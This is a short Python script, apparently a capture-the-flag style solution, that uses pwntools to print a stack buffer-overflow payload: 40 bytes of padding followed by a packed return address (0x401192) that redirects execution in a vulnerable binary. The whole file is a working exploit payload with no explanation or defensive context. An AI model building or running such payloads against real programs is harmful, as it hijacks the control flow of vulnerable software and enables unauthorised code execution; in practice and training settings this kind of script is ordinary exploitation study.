import sys
from pwn import p64

sys.stdout.buffer.write(b"A"*32+b"B"*8+p64(0x0000000000401192)+b"\n")
